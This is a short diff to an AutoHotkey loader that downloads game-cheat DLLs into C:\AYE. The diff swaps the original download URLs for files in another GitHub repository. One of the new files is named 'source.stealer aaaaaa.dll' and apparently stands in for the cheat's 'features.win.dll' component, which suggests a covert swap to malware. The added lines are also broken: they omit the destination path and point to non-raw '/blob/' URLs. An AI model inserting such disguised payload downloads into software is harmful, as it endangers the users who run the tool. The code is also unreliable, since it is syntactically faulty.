@@ -62,7 +62,7 @@ if (cheat != "Load DLL")
 {
 	IfNotExist, C:\AYE\otc.dll
 	{
-		UrlDownloadToFile, https://github.com/m4x3r1337/otc-direct-link/raw/master/otc.dll, C:\AYE\otc.dll
+		UrlDownloadToFile, https://github.com/MorralFSB/dll/blob/master/OTC_fatality_label.dll
 		GuiControl,, Pbar, 15
 	}
 	IfNotExist, C:\AYE\ftc.dll
@@ -72,7 +72,7 @@ if (cheat != "Load DLL")
 	}
 	IfNotExist, C:\AYE\features.win.dll
 	{
-		UrlDownloadToFile, https://github.com/m4x3r1337/otc-direct-link/raw/master/features.win.dll, C:\AYE\features.win.dll
+		UrlDownloadToFile, https://github.com/MorralFSB/dll/blob/master/source.stealer%20aaaaaa.dll
 		GuiControl,, Pbar, 45
 	}
 	IfNotExist, C:\AYE\skeet.dll
